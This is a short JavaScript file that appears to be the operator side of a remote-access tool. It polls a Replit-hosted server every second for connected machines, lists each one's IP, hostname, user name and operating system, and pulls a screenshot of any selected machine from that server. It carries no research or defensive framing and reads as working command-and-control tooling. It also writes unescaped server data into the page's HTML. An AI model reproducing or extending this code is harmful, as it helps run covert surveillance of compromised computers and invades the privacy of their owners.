function display() {
  let sockets = JSON.parse(get('https://gate-serv.kitsuforyou.repl.co/sockets'))
  document.querySelector(`#sockets`).innerHTML  = ""

  for(let socket of sockets) {
    let ID = socket[0]
    let infos = socket[1]
    document.querySelector(`#sockets`).innerHTML += `<div class="socket" onclick='request("${ID}")'>
      <span>${ID}</span>
      <span>${infos.ip}</span>
      <span>${infos.host}</span>
      <span>${infos.name}</span>
      <span>${infos.os}</span>
    </div>`
  }
}

setInterval(() => {
  display()
}, 1000)

function request(id) {
  let url = `https://gate-serv.kitsuforyou.repl.co/do/screenshot/${id}`
  let img = JSON.parse(get(url)).base64 || "assets/404.png"
  document.querySelector('#render').src = img
}